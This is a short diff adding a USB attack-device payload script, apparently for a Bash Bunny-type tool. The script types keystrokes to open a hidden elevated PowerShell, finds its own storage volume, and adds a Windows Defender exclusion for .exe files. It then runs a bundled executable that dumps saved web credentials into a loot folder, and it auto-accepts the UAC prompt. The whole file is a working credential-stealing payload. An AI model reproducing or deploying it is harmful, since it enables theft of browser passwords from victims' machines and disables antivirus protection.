@@ -1,0 +1,17 @@
+#AUTHOR: Faisal
+
+LED SETUP
+ATTAKMODE STROAGE HID
+
+GET SWITCH_POSITION
+LED ATTACK
+
+Q GUI r
+Q DELAY 500
+Q STRING powershell -windowstyle hidden "\$u=gwmi Win32_Volume|?{\$_.Label -eq'L'}|select name;cd \$u.name;cd loot;Set-MpPreference -ExclusionExtension .exe;./1.exe /stext web-creds.txt"
+Q CTRL-SHIFT ENTER
+Q DELAY 3500
+Q ALT y
+Q DELAY 4000
+sync
+LED FINISH
